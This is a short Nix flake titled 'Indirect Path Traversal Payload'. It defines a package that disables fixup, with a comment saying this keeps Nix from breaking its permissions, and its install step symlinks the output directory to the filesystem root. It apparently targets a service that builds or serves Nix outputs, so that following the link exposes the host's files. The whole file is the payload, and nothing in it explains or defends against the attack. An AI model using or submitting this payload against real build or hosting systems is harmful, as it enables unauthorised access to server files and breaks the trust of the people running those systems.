{
  description = "Indirect Path Traversal Payload";

  inputs.nixpkgs.url = "github:NixOS/nixpkgs/nixos-unstable";

  outputs = { self, nixpkgs }: 
  let
    system = "x86_64-linux";
    pkgs = import nixpkgs { inherit system; };
  in {
    packages.${system}.default = pkgs.stdenv.mkDerivation {
      pname = "symlink-dir";
      version = "1.0";
      src = ./.;

      dontConfigure = true;
      dontBuild = true;
      dontFixup = true; # Stop Nix from breaking our permissions!

      installPhase = ''
        mkdir -p $out
        # Create a shortcut to the root of the server
        ln -s / $out/rootfs
      '';
    };
  };
}
